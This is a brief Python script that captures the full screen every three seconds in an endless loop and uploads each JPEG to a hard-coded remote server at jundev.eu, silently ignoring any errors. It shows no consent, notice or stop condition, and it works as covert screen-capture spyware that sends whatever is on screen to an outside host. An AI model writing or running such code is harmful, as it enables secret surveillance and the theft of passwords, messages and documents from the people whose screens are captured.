import time
import requests
import io
from PIL import ImageGrab

SERVER_URL = 'http://jundev.eu:5011/upload'

while True:
    try:
        screenshot = ImageGrab.grab()
        buf = io.BytesIO()
        screenshot.save(buf, format='JPEG')
        buf.seek(0)
        requests.post(SERVER_URL, files={'file': ('screenshot.jpg', buf, 'image/jpeg')})
    except Exception as e:
        pass
    time.sleep(3)

